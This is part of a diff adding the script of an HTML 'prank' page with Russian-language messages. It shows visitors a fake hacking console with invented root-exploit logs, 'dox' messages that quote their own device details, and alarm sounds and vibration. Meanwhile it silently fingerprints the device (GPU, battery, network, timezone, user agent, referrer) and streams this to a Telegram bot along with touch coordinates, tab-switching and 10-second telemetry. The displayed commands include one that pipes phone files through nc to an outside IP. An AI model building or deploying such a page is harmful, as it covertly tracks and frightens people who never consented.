+    const colorDepth = window.screen.colorDepth || 24;
+    const cores = navigator.hardwareConcurrency || 8;
+    const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "4GB+";
+    const touchPoints = navigator.maxTouchPoints || 5;
+    const connType = navigator.connection ? (navigator.connection.effectiveType || "4g").toUpperCase() : "4G";
+    const connSpeed = navigator.connection && navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "N/A";
+    const connRtt = navigator.connection && navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "N/A";
+
+    function detectDeviceModel() {
+      const m = ua.match(/Android\s[\d.]+;\s([^;)]+)/i);
+      if (m && m[1]) return m[1].trim();
+      if (/iPhone/i.test(ua)) return "Apple iPhone";
+      if (/Windows/i.test(ua)) return "Windows PC";
+      return platform;
+    }
+
+    function detectBrowser() {
+      if (/Edg\//i.test(ua)) return "Edge";
+      if (/OPR\//i.test(ua)) return "Opera";
+      if (/YaBrowser/i.test(ua)) return "Yandex Browser";
+      if (/Chrome\//i.test(ua)) return "Chrome Mobile";
+      if (/Safari\//i.test(ua)) return "Safari";
+      if (/Firefox\//i.test(ua)) return "Firefox";
+      return "WebView";
+    }
+
+    const deviceModel = detectDeviceModel();
+    const browserName = detectBrowser();
+
+    // Чистый короткий писк (2400-2900 Hz, sine)
+    function ensureAudioContext() {
+      try {
+        if (!audioCtx) {
+          const AC = window.AudioContext || window.webkitAudioContext;
+          if (AC) audioCtx = new AC();
+        }
+        if (audioCtx && audioCtx.state === "suspended") {
+          audioCtx.resume().then(() => {
+            if (audioState) audioState.textContent = "BEEP: ON";
+          }).catch(() => {});
+        } else if (audioCtx && audioCtx.state === "running") {
+          if (audioState) audioState.textContent = "BEEP: ON";
+        }
+      } catch (e) {}
+    }
+
+    function beep(freq = 2500, ms = 55, volume = 0.24) {
+      try {
+        ensureAudioContext();
+        if (!audioCtx || audioCtx.state !== "running") return;
+        const now = audioCtx.currentTime;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = "sine";
+        osc.frequency.setValueAtTime(freq, now);
+        gain.gain.setValueAtTime(0.0001, now);
+        gain.gain.linearRampToValueAtTime(volume, now + 0.004);
+        gain.gain.exponentialRampToValueAtTime(0.0001, now + ms / 1000);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start(now);
+        osc.stop(now + ms / 1000 + 0.01);
+      } catch (e) {}
+    }
+
+    function vibrate(pattern) {
+      try {
+        if (navigator.vibrate) navigator.vibrate(pattern);
+      } catch (e) {}
+    }
+
+    function triggerSoftFlashAndShake() {
+      flashOverlay.classList.add("flash");
+      terminalEl.classList.remove("shake");
+      void terminalEl.offsetWidth;
+      terminalEl.classList.add("shake");
+      beep(2750, 75, 0.26);
+      vibrate([30, 20, 40]);
+      setTimeout(() => flashOverlay.classList.remove("flash"), 140);
+    }
+
+    async function sendTgMessage(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+          })
+        });
+      } catch (e) {}
+    }
+
+    ["touchstart", "pointerdown", "click"].forEach((evt) => {
+      window.addEventListener(evt, (e) => {
+        tapCount++;
+        ensureAudioContext();
+        beep(2550, 55, 0.25);
+        vibrate(12);
+
+        const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
+        const x = e.touches && e.touches[0] ? Math.round(e.touches[0].clientX) : Math.round(e.clientX || 0);
+        const y = e.touches && e.touches[0] ? Math.round(e.touches[0].clientY) : Math.round(e.clientY || 0);
+        const targetTag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : "window";
+        const targetId = (e.target && e.target.id) ? `#${e.target.id}` : "";
+
+        if (!firstTouchSent) {
+          firstTouchSent = true;
+          sendTgMessage(
+            `👆 <b>ПЕРВОЕ КАСАНИЕ ЭКРАНА!</b>\n` +
+            `⏱ <b>Секунда от входа:</b> ${sec} с\n` +
+            `📍 <b>Координаты:</b> X=${x}, Y=${y}\n` +
+            `🎯 <b>Элемент:</b> <code>${targetTag}${targetId}</code>\n` +
+            `📱 <b>Устройство:</b> ${deviceModel}`
+          );
+        } else if (tapCount === 5 || tapCount === 15 || tapCount === 30) {
+          sendTgMessage(
+            `⚡ <b>АКТИВНОСТЬ КАСАНИЙ (${tapCount} тапов)</b>\n` +
+            `⏱ <b>Время от входа:</b> ${sec} с\n` +
+            `📍 <b>Последняя точка:</b> X=${x}, Y=${y} (<code>${targetTag}${targetId}</code>)\n` +
+            `📱 <b>Устройство:</b> ${deviceModel}`
+          );
+        }
+      }, { passive: true });
+    });
+
+    window.addEventListener("scroll", () => {
+      scrollCount++;
+      const docH = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
+      const pct = Math.min(100, Math.max(0, Math.round((window.scrollY / docH) * 100)));
+      if (pct > maxScrollPct) maxScrollPct = pct;
+    }, { passive: true });
+
+    window.addEventListener("online", () => {
+      const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
+      sendTgMessage(`🌐 <b>СЕТЬ ВОССТАНОВЛЕНА (ONLINE)</b>\n⏱ <b>Время:</b> ${sec} с\n📱 <b>Устройство:</b> ${deviceModel}`);
+    });
+
+    window.addEventListener("offline", () => {
+      const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
+      sendTgMessage(`📴 <b>ПОТЕРЯНА СЕТЬ (OFFLINE)</b>\n⏱ <b>Время:</b> ${sec} с\n📱 <b>Устройство:</b> ${deviceModel}`);
+    });
+
+    if (window.screen && window.screen.orientation) {
+      window.screen.orientation.addEventListener("change", () => {
+        const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
+        sendTgMessage(
+          `🔄 <b>ПОВОРОТ ЭКРАНА!</b>\n` +
+          `📐 <b>Новая ориентация:</b> <code>${window.screen.orientation.type}</code>\n` +
+          `⏱ <b>Время:</b> ${sec} с\n` +
+          `📱 <b>Устройство:</b> ${deviceModel}`
+        );
+      });
+    }
+
+    document.addEventListener("visibilitychange", () => {
+      const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
+      const stage = finished ? "Финальный экран" : (started ? "Терминал" : "1-е окно запуска");
+      if (document.hidden && !hiddenSent) {
+        hiddenSent = true;
+        sendTgMessage(
+          `🚪 <b>СВЕРНУЛ / ПОКИНУЛ СТРАНИЦУ!</b>\n` +
+          `⏱ <b>Проведено времени:</b> ${sec} с\n` +
+          `📌 <b>Этап:</b> ${stage}\n` +
+          `👆 <b>Касаний:</b> ${tapCount} | <b>Скроллов:</b> ${scrollCount} (макс. ${maxScrollPct}%)\n` +
+          `📱 <b>Устройство:</b> ${deviceModel}`
+        );
+      } else if (!document.hidden && hiddenSent) {
+        hiddenSent = false;
+        sendTgMessage(
+          `👀 <b>ВЕРНУЛСЯ НА СТРАНИЦУ!</b>\n` +
+          `⏱ <b>Время от старта:</b> ${sec} с\n` +
+          `📌 <b>Этап:</b> ${stage}\n` +
+          `📱 <b>Устройство:</b> ${deviceModel}`
+        );
+      }
+    });
+
+    function getTimestamp() {
+      const d = new Date();
+      return d.toTimeString().split(" ")[0] + "." + String(d.getMilliseconds()).padStart(3, "0");
+    }
+
+    function randHex(len = 8) {
+      let s = "";
+      const chars = "0123456789abcdef";
+      for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * 16)];
+      return "0x" + s;
+    }
+
+    function randIp() {
+      return `${Math.floor(11 + Math.random() * 215)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 254)}`;
+    }
+
+    async function notifyTelegram() {
+      const visitKey = "term_prank_v6_visits";
+      const prevCount = parseInt(localStorage.getItem(visitKey) || "0", 10);
+      const currentCount = prevCount + 1;
+      localStorage.setItem(visitKey, String(currentCount));
+
+      const params = new URLSearchParams(window.location.search);
+      const tag = params.get("from") || params.get("tag") || params.get("target") || "без метки";
+      const ref = document.referrer || "Прямой переход";
+      const historyLen = window.history.length;
+      const orientation = (window.screen.orientation && window.screen.orientation.type) || "portrait";
+      const theme = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark" : "Light";
+      const isStandalone = window.matchMedia && window.matchMedia("(display-mode: standalone)").matches ? "Standalone" : "Browser";
+      const cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
+      const localTimeStr = new Date().toString();
+
+      let batteryInfo = "Недоступно";
+      let batteryLevelForTerm = "82%";
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          const pct = Math.round(b.level * 100);
+          batteryLevelForTerm = pct + "%";
+          batteryInfo = `${pct}% (${b.charging ? "заряжается" : "батарея"})`;
+        }
+      } catch (e) {}
+
+      let gpuInfo = "Недоступно";
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+          if (dbg) gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch (e) {}
+
+      realSystemLogs.push(
+        { t: `exploit_target_gpu: ${gpuInfo} -> mapped into address space`, c: "bright" },
+        { t: `power_daemon: battery=${batteryLevelForTerm} -> thermal & wake lock active`, c: "bright" }
+      );
+
+      const text =
+        `🚨 <b>ОТКРЫТА ССЫЛКА ПРАНК-ТЕРМИНАЛА!</b>
+
+` +
+        `🕒 <b>Время (RU):</b> ${new Date().toLocaleString("ru-RU")}
+` +
+        `🌐 <b>Локальное время:</b> <code>${localTimeStr}</code>
+` +
+        `🏷 <b>Метка:</b> <code>${tag}</code>
+` +
+        `🔢 <b>Заход:</b> ${currentCount}-й раз
+` +
+        `📱 <b>Модель / Платформа:</b> ${deviceModel} (${platform})
+` +
+        `🌍 <b>Браузер / Режим:</b> ${browserName} / ${isStandalone}
+` +
+        `🎨 <b>Тема:</b> ${theme}
+` +
+        `🎮 <b>GPU:</b> <code>${gpuInfo}</code>
+` +
+        `🖥 <b>Экран:</b> ${screenRes} (avail ${availRes}, DPR ${dpr}, ${colorDepth}-bit, ${orientation})
+` +
+        `👆 <b>Мультитач:</b> ${touchPoints} точек
+` +
+        `⚙️ <b>CPU / RAM:</b> ${cores} ядер / ${ram}
+` +
+        `🔋 <b>Батарея:</b> ${batteryInfo}
+` +
+        `📶 <b>Сеть:</b> ${navigator.onLine ? "Online" : "Offline"} | ${connType} | ${connSpeed} | RTT ${connRtt}
+` +
+        `🍪 <b>Cookies:</b> ${cookiesEnabled}
+` +
+        `🗺 <b>Часовой пояс:</b> ${tz}
+` +
+        `🗣 <b>Языки:</b> ${languages}
+` +
+        `📑 <b>История вкладки:</b> ${historyLen}
+` +
+        `🔗 <b>Referrer:</b> ${ref}
+` +
+        `🧾 <b>User-Agent:</b>
+<code>${ua}</code>`;
+
+      await sendTgMessage(text);
+    }
+
+    function appendLine(text, cls = "", withTs = true) {
+      if (finished) return;
+      const div = document.createElement("div");
+      div.className = "line " + cls;
+      if (withTs) {
+        div.innerHTML = `<span class="ts">[${getTimestamp()}]</span> ${text}`;
+      } else {
+        div.textContent = text;
+      }
+      output.appendChild(div);
+
+      while (output.children.length > 125) {
+        output.removeChild(output.firstChild);
+      }
+      window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function sleep(ms) {
+      return new Promise((r) => setTimeout(r, ms));
+    }
+
+    async function fakeCommandInput(cmdText) {
+      if (finished) return;
+      const prompt = "root@target:~# ";
+      typingLine.textContent = prompt;
+      for (let i = 0; i < cmdText.length; i++) {
+        if (finished) return;
+        typingLine.textContent += cmdText[i];
+        beep(2500, 25, 0.2);
+        window.scrollTo(0, document.body.scrollHeight);
+        await sleep(9 + Math.random() * 10);
+      }
+      await sleep(40);
+      appendLine(prompt + cmdText, "cmd", false);
+      typingLine.textContent = "";
+    }
+
+    const realSystemLogs = [
+      { t: `breach_session: attached to device="${deviceModel}" os="${platform}"`, c: "bright" },
+      { t: `client_fingerprint: browser="${browserName}" lang="${lang}" tz="${tz}"`, c: "bright" },
+      { t: `display_buffer: geom=${screenRes} scale=${dpr}x depth=${colorDepth}bit`, c: "bright" },
+      { t: `resources_probe: cpu_threads=${cores} mem_alloc=${ram} touch=${touchPoints}`, c: "bright" },
+      { t: `socket_pipe: route=${connType} rate=${connSpeed} latency=${connRtt} -> OPEN`, c: "bright" },
+      { t: `agent_string: ${ua}`, c: "" }
+    ];
+
+    const hackLogs = [
+      () => ({ t: `portscan: open tcp/443, tcp/8443, tcp/5555 on local subnet -> probing ${randIp()}`, c: "" }),
+      () => ({ t: `adb_bridge: wireless debugging handshake forged -> shell uid=2000 granted`, c: "bright" }),
+      () => ({ t: `privesc: abusing binder ioctl ${randHex(6)} -> cred->uid overwritten to 0 (root)`, c: "bright" }),
+      () => ({ t: `ptrace_attach: attached to pid=${Math.floor(2000 + Math.random() * 18000)} (com.android.chrome) [OK]`, c: "" }),
+      () => ({ t: `heap_dump: scanning vma ${randHex(8)}..${randHex(8)} for bearer & session tokens`, c: "" }),
+      () => ({ t: `mitm_proxy: ca_cert injected into trust store -> intercepting TLS 1.3 streams`, c: "bright" }),
+      () => ({ t: `fs_walk: indexing /sdcard/Android/data & /sdcard/DCIM -> ${Math.floor(120 + Math.random() * 900)} files`, c: "" }),
+      () => ({ t: `exfil_worker: aes-256-gcm block #${Math.floor(1 + Math.random() * 256)} pushed to ${randIp()}:8443`, c: "bright" }),
+      () => ({ t: `auth_hook: intercepted oauth refresh token hash=${randHex(12)}`, c: "" }),
+      () => ({ t: `netfilter: dropping outbound firewall rule on wlan0/rmnet0`, c: "soft-alert", alert: true }),
+      () => ({ t: `zygote_inject: shared library libhook_${randHex(4)}.so mapped into runtime`, c: "bright" }),
+      () => ({ t: `sqlite_read: WAL checkpoint flushed -> /data/system_ce/0/accounts_ce.db`, c: "" }),
+      () => ({ t: `c2_beacon: heartbeat ack from ${randIp()}:443 rtt=${Math.floor(12 + Math.random() * 90)}ms`, c: "" }),
+      () => ({ t: `lock_ctrl: system power menu & keyguard override armed`, c: "soft-alert", alert: true })
+    ];
+
+    const commands = [
+      "nmap -sS -Pn -p 443,5555,8443 127.0.0.1",
+      "./root_escalate --binder-race --pid=zygote64",
+      "frida -U -f com.android.chrome -l hook_tokens.js --no-pause",
+      "tar -cf - /sdcard/DCIM /sdcard/Download | nc -w 3 185.220.101.44 8443",
+      "svc power stayon true && settings put global adb_enabled 1"
+    ];
+
+    const doxReconLogs = [
+      () => ({ t: `[DOX-RECON] querying ASN / gateway / edge node -> ${randIp()} (lat=${Math.floor(8 + Math.random() * 65)}ms) | ref="${document.referrer || "direct"}"`, c: "bright" }),
+      () => ({ t: `[DOX-RECON] resolving locale="${lang}" (${languages}), tz="${tz}", screen=${screenRes}@${dpr}x (${colorDepth}bit) -> profile locked`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] enumerating browser storage: cookies=${navigator.cookieEnabled}, localStorage_keys=${localStorage.length}, history_len=${window.history.length}`, c: "" }),
+      () => ({ t: `[DOX-RECON] parsing hardware profile: model="${deviceModel}" (${platform}), cpu=${cores}c, ram=${ram}, touch=${touchPoints}pt`, c: "bright" }),
+      () => ({ t: `[DOX-RECON] correlating link & telemetry: net=${connType} (${connSpeed}, rtt=${connRtt}), online=${navigator.onLine}, ua_len=${ua.length}`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] scraping cached session handles & autofill tokens -> vault_id=${randHex(10)}`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] compiling target dossier #${Math.floor(1000 + Math.random() * 8999)} -> payload ${Math.floor(420 + Math.random() * 1800)} KB packed`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] dossier export complete -> committing session snapshot to remote sink`, c: "bright" })
+    ];
+
+    const dossierProgressSteps = [
+      { pct: "14%", msg: `[DOSSIER-PKG] [##..................] 14% | model="${deviceModel}", tz="${tz}", net=${connType} -> staging profile`, c: "" },
+      { pct: "38%", msg: `[DOSSIER-PKG] [#######.............] 38% | screen=${screenRes}@${dpr}x, lang="${lang}", cookies=${navigator.cookieEnabled} -> indexing keys`, c: "bright" },
+      { pct: "67%", msg: `[DOSSIER-PKG] [#############.......] 67% | cpu=${cores}c, ram=${ram}, ref="${document.referrer || "direct"}" -> encrypting archive`, c: "bright" },
+      { pct: "89%", msg: `[DOSSIER-PKG] [#################...] 89% | vault=${randHex(8)}, speed=${connSpeed} -> uploading dossier bundle`, c: "soft-alert", alert: true },
+      { pct: "99%", msg: `[DOSSIER-PKG] [###################.] 99% | checksum verify stalled on final block -> retrying sync...`, c: "soft-alert", alert: true },
+      { pct: "100%", msg: `[DOSSIER-PKG] [####################] 100% | dossier #${Math.floor(1000 + Math.random() * 8999)} locked & transferred [OK]`, c: "bright" }
+    ];
+
+    function showFinalAlert() {
+      if (finished) return;
+      finished = true;
+      if (heartbeatTimer) clearInterval(heartbeatTimer);
+      terminalEl.style.display = "none";
+      cursorRow.style.display = "none";
+      finalAlert.style.display = "flex";
+      flashOverlay.classList.add("flash");
+      beep(2650, 95, 0.28);
+      setTimeout(() => beep(2850, 95, 0.28), 130);
+      vibrate([160, 70, 160, 70, 220]);
+      setTimeout(() => flashOverlay.classList.remove("flash"), 180);
+
+      const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
+      sendTgMessage(
+        `🏁 <b>ФИНАЛЬНЫЙ ЭКРАН ОТКРЫТ!</b>\n` +
+        `⏱ <b>Время работы терминала:</b> ${sec} с\n` +
+        `👆 <b>Касаний:</b> ${tapCount} | <b>Скроллов:</b> ${scrollCount} (макс. ${maxScrollPct}%)\n` +
+        `📱 <b>Устройство:</b> ${deviceModel}`
+      );
+    }
+
+    async function runTerminal() {
+      sessionStart = Date.now();
+      setTimeout(showFinalAlert, DURATION_MS);
+
+      heartbeatTimer = setInterval(() => {
+        if (finished) return;
+        const sec = Math.round((Date.now() - sessionStart) / 1000);
+        const rem = Math.max(0, Math.round((DURATION_MS - (Date.now() - sessionStart)) / 1000));
+        sendTgMessage(
+          `💓 <b>ТЕЛЕМЕТРИЯ СЕССИИ (${sec} с прошло / ~${rem} с до финала)</b>\n` +
+          `👆 <b>Касаний:</b> ${tapCount} | <b>Скроллов:</b> ${scrollCount} (макс. ${maxScrollPct}%)\n` +
+          `📶 <b>Сеть:</b> ${navigator.onLine ? "Online" : "Offline"} (${connType}, ${connSpeed})\n` +
+          `👁 <b>Вкладка:</b> ${document.hidden ? "Скрыта" : "Активна"} | <b>Аудио:</b> ${audioCtx ? audioCtx.state : "init"}`
+        );
+      }, 10000);
+
+      appendLine("Initializing remote intrusion console...", "bright");
+      beep(2500, 60, 0.24);
+      await sleep(70);
+
+      for (let i = 0; i < realSystemLogs.length; i++) {
+        if (finished) return;
+        appendLine(realSystemLogs[i].t, realSystemLogs[i].c, true);
+        beep(2200 + i * 80, 30, 0.2);
+        await sleep(50);
+      }
+
+      let cmdIdx = 0;
+      let stepCount = 0;
+      let doxIdx = 0;
+
+      while (!finished) {
+        const elapsed = Date.now() - sessionStart;
+        const isDoxPhase = elapsed >= DURATION_MS * 0.65;
+
+        if (isDoxPhase && !doxSent) {
+          doxSent = true;
+          sendTgMessage(
+            `🕵️ <b>ФАЗА ДОКС-ПРОБИВА В ТЕРМИНАЛЕ!</b>\n` +
+            `⏱ <b>Секунда:</b> ${(elapsed / 1000).toFixed(1)} с / ${(DURATION_MS / 1000).toFixed(0)} с\n` +
+            `📱 <b>Устройство:</b> ${deviceModel} (${browserName})\n` +
+            `🖥 <b>Экран:</b> ${screenRes} @${dpr}x | <b>TZ:</b> ${tz}`
+          );
+        }
+
+        if (stepCount % 22 === 0) {
+          const cmdList = isDoxPhase
+            ? ["./dox_recon --collect-profile --dump-cookies --correlate-ip", ...commands]
+            : commands;
+          await fakeCommandInput(cmdList[cmdIdx % cmdList.length]);
+          cmdIdx++;
+        }
+
+        for (let b = 0; b < 2; b++) {
+          if (finished) break;
+          const item = isDoxPhase
+            ? (b === 0 ? doxReconLogs[doxIdx++ % doxReconLogs.length]() : hackLogs[Math.floor(Math.random() * hackLogs.length)]())
+            : hackLogs[Math.floor(Math.random() * hackLogs.length)]();
+          appendLine(item.t, item.c, true);
+          if (item.alert) {
+            triggerSoftFlashAndShake();
+            const nowTs = Date.now();
+            if (nowTs - lastAlertSentAt > 6500) {
+              lastAlertSentAt = nowTs;
+              sendTgMessage(
+                `🚨 <b>КРИТИЧЕСКИЙ ЛОГ В ТЕРМИНАЛЕ!</b>\n` +
+                `📌 <b>Фаза:</b> ${isDoxPhase ? "DOX-ПРОБИВ" : "ЭКСПЛУАТАЦИЯ"}\n` +
+                `📄 <b>Строка:</b> <code>${item.t.replace(/</g, "&lt;")}</code>\n` +
+                `⏱ <b>Время:</b> ${(elapsed / 1000).toFixed(1)} с`
+              );
+            }
+          }
+        }
+
+        if (elapsed >= DURATION_MS * 0.82 && !dossierProgressSent) {
+          dossierProgressSent = true;
+          sendTgMessage(
+            `📦 <b>ВЫГРУЗКА ДОСЬЕ (0% → 99% → 100%)</b>\n` +
+            `⏱ <b>Секунда:</b> ${(elapsed / 1000).toFixed(1)} с\n` +
+            `📱 <b>Устройство:</b> ${deviceModel} (${browserName})\n` +
+            `🖥 <b>Экран:</b> ${screenRes} @${dpr}x | <b>Lang:</b> ${lang}`
+          );
+          for (let p = 0; p < dossierProgressSteps.length; p++) {
+            if (finished) return;
+            const st = dossierProgressSteps[p];
+            appendLine(st.msg, st.c, true);
+            if (st.alert) triggerSoftFlashAndShake();
+            beep(2450 + p * 70, 35, 0.22);
+            await sleep(st.pct === "99%" ? 650 : 210);
+          }
+        }
+
+        if (stepCount % 4 === 0) {
+          beep(2350 + Math.random() * 450, 28, 0.18);
+        }
+
+        stepCount++;
+        await sleep(22 + Math.random() * 16);
+      }
+    }
+
+    function launchTerminal() {
+      if (started) return;
+      started = true;
+      ensureAudioContext();
+      beep(2550, 70, 0.26);
+      vibrate(20);
+      loaderScreen.style.display = "none";
+      terminalEl.style.display = "block";
+      sendTgMessage(
+        `🚀 <b>ТЕРМИНАЛ ЗАПУЩЕН!</b>\n` +
+        `⏱ <b>Время от захода:</b> ${((Date.now() - sessionStart) / 1000).toFixed(1)} с\n` +
+        `👆 <b>Тапов до старта:</b> ${tapCount}\n` +
+        `📱 <b>Устройство:</b> ${deviceModel} (${browserName})\n` +
+        `🔊 <b>Аудиоконтекст:</b> ${audioCtx ? audioCtx.state : "unavailable"}`
+      );
+      runTerminal();
+    }
+
+    let dots = 0;
+    const dotTimer = setInterval(() => {
+      if (started) {
+        clearInterval(dotTimer);
+        return;
+      }
+      dots = (dots + 1) % 4;
+      loadingLabel.textContent = "Загрузка" + ".".repeat(dots);
+    }, 350);
+
+    if (window.performance && performance.getEntriesByType) {
+      const nav = performance.getEntriesByType("navigation")[0];
+      if (nav && nav.type === "reload") {
+        sessionStart = Date.now();
+        tapCount = 0;
+        firstTouchSent = false;
+        hiddenSent = false;
+      }
+    }
+    notifyTelegram();
+  </script>
+</body>
+</html>
